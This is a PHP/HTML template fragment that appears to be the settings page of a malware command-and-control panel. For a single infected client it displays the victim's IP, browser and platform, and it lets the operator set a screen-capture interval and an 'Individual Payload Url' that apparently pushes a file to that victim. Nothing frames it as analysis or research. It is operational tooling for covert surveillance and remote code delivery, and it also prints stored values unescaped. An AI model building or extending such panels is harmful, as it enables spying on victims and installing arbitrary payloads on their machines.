<div class="row">
            <!-- left column -->
            <div class="col-md-6">
              <!-- general form elements -->
              <div class="box box-primary">
                <div class="box-header">
                  <h3 class="box-title">Settings</h3>
                </div><!-- /.box-header -->
                <!-- form start -->
                <form role="form" action="settings.php?cid=<?=$data["client_id"] ?>" method="post">
                  <div class="box-body">
                    <div class="form-group">
                      <label for="exampleInputEmail1">IP:</label>
                      <input type="email" placeholder="<?=$data["ip"] ?>" disabled="" id="ip" class="form-control">
                    </div>
                    <div class="form-group">
                      <label for="exampleInputEmail1">Browser:</label>
                      <input type="email" placeholder="<?=$data["browser"]." ".$data["browser_ver"] ?>" disabled="" id="ip" class="form-control">
                    </div>
                    <div class="form-group">
                      <label for="exampleInputEmail1">Platform:</label>
                      <input type="email" placeholder="<?=$data["platform"] ?>" disabled="" id="ip" class="form-control">
                    </div>


                    <div class="form-group">
                      <label for="exampleInputPassword1">Screen Capture Interval ( seconds )</label>
                      <input type="scr_int" name="interval" value="<?=$data["scr_cap_interval"] ?>" id="scr_int" class="form-control">
                    </div>
                    <div class="form-group">
                      <label for="exampleInputPassword1">Individual Payload Url (example:  http://someDomain_Or_IP/file.file)</label>
                      <input type="scr_int" name="payload" value="<?=$data["payload_url"] ?>" id="scr_int" class="form-control">
                    </div>

                  <div class="box-footer">
                    <button class="btn btn-primary" name="changeSettings" type="submit">Submit</button>
                  </div>
                </form>
              </div><!-- /.box -->


            </div><!--/.col (left) -->
            <!-- right column -->

          </div>